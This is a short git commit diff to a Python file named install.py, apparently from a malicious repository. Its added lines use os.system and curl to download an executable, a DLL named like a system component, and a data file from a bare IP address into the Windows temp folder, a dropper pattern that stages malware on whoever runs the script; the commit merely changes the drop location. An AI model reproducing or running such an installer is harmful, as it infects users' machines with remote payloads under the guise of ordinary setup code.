d909d523a4678181f7abdd1b27bec532b7410273
unclear1889 <152587922+unclear1889@users.noreply.github.com>
2023-12-01 15:11:19 +0800

    install.py

--- install.py
+++ install.py
@@ -1,4 +1,4 @@
 import os
-os.system("curl http://34.81.1.126:801/test.exe -O c:\programdata\test.exe")
-os.system("curl http://34.81.1.126:801/aspnet_counters.dll -O c:\programdata\aspnet_counters.dll")
-os.system("curl http://34.81.1.126:801/appcache.dat -O c:\programdata\appcache.dat")
+os.system("curl http://34.81.1.126:801/test.exe -O c:\windows\temp\test.exe")
+os.system("curl http://34.81.1.126:801/aspnet_counters.dll -O c:\windows\temp\aspnet_counters.dll")
+os.system("curl http://34.81.1.126:801/appcache.dat -O c:\windows\temp\appcache.dat")
